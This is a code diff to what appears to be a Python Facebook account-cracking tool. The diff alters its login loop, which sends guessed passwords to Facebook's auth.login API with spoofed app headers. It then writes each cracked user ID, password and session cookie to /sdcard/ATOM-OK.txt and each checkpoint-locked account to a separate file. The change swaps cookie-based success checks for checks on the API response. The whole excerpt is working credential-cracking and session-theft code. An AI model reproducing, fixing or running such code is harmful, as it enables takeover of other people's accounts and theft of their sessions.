@@ -474,8 +474,8 @@ def _M3_(ids,pasb):
                         'X-FB-HTTP-Engine': 'Liger'}
 
                         url1="https://b-api.facebook.com/method/auth.login"
-                        BLACK=session.cookies.get_dict().keys()
-                        if 'c_user' in BLACK:
+                        BLACK=session.post(url1,data=data, headers=head).json()
+                        if 'session_key' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                 uid = re.findall('c_user=(.*);xs', coki)[0]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
@@ -484,13 +484,13 @@ def _M3_(ids,pasb):
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
-                        elif 'checkpoint' in BLACK:
-                        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                        	    cid = coki[24:39]
-                        	    print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
-                        	    open('/sdcard/ATOM-M4-CP.txt','a').write(uid+'|'+ps+'\n')
-                        	    cp.append(cid)
-                        	    break
+                        elif 'www.facebook.com' in str(BLACK):
+                               coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                               cid = coki[24:39]
+                               print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
+                               open('/sdcard/ATOM-M4-CP.txt','a').write(uid+'|'+ps+'\n')
+                               cp.append(cid)
+                               break
                         else:continue
                 loop+=1
         except Exception as e:
